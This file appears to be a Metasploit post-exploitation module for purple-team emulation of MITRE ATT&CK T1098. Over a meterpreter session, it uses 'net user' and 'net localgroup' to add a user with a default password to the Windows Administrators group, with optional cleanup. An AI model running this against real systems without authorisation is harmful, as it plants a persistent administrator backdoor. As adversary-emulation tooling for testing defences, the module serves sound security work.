##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Account Manipulation (T1098) Windows - Purple Team',
                      'Description'   => %q{
                        Credential Access, Persistence:
                        Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1098' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptBool.new("ADD_USER", [ true, "Add a new user.", true]),
      OptBool.new("ADD_TO_GROUP", [ true, "Add the user to a group.", true]),
      OptBool.new("CLEANUP", [ true, "Revert changes.", true]),
      OptString.new("USER", [ true, "Username.", 'T1098']),
      OptString.new("PASS", [ true, "Password for the new user.", 'TTPT3st!ng12!']),
      OptString.new("GROUP", [ true, "Add the user to this group.", 'Administrators'])
    ])
  end

  def run
    begin
      raise "Module requires meterpreter session" if not session.type == 'meterpreter'
      fail_with(Failure::NoAccess, "Module requires administrator rights.") unless is_admin?

      add_user = datastore['ADD_USER']
      add_to_group = datastore['ADD_TO_GROUP']
      user = datastore['USER']
      passwd = datastore['PASS']
      group = datastore['GROUP']
      cleanup = datastore['CLEANUP']

      if add_user
        print_status("Adding '#{user}' as a user...")
        run_cmd("net user #{user} #{passwd} /add")
      end

      if add_to_group
        print_status("Adding user '#{user}' to the '#{group}' group...")
        run_cmd("net localgroup #{group} #{user} /add")
      end

      if add_user and cleanup
        print_status("Removing user...")
        run_cmd("net user #{user} /delete")
      else
        if add_to_group and cleanup
          print("Reverting group membership changes...")
          run_cmd("net group #{group} #{user} /delete")
        end
      end

      print_good("Module T1098W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1098W execution failed.")
    end
  end
end
